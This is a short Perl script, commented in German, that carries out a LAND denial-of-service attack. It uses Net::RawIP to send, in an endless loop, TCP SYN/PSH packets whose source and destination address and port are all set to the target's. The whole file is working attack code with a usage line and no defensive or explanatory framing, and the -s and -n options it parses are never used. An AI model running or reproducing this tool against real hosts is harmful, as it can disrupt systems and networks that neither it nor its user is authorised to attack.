#!/usr/bin/perl
# *******  der LAND-ATTACK  **************
# use with care
# 

require 'getopts.pl';

use Net::RawIP;

Getopts('i:p:s:n:');

$a = new Net::RawIP;

die "Usage $0 -i <target addr> -p <target port> -s <src_net> -n <counts>" unless ($opt_i && $opt_p);

###  ---- hoppla jetzt wirds ernst ------------


for(;;) {
$a->set({ ip => {saddr => $opt_i,
		daddr => $opt_i
                },
         tcp=> {dest => $opt_p,
                source => $opt_p,
                psh => 1,
                syn => 1}
       });
###  --- und weg damit ---->>>>>
$a->send(1,1);
$i++;
}

